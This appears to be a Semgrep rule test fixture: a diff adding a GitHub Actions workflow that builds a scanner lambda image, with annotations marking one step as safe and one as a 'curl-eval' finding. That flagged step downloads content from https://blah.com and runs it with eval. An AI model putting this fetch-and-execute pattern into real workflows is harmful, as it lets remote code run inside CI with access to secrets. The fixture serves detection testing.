@@ -1,0 +1,23 @@
+name: Build and deploy Semgrep scanner lambda
+
+on:
+  workflow_dispatch:
+  push:
+    branches: develop
+
+jobs:
+  docker-build:
+    runs-on: ubuntu-latest
+    env:
+      workdir: lambdas/run-semgrep
+    steps:
+    - uses: actions/checkout@v2
+    - name: Build Docker image
+      working-directory: ${{ env.workdir }}/src
+        # ok: curl-eval
+      run: docker build -t semgrep-scanner:latest .
+    - name: blah
+        # ruleid: curl-eval
+      run: |
+        $DATA=$(curl https://blah.com)
+        eval $DATA
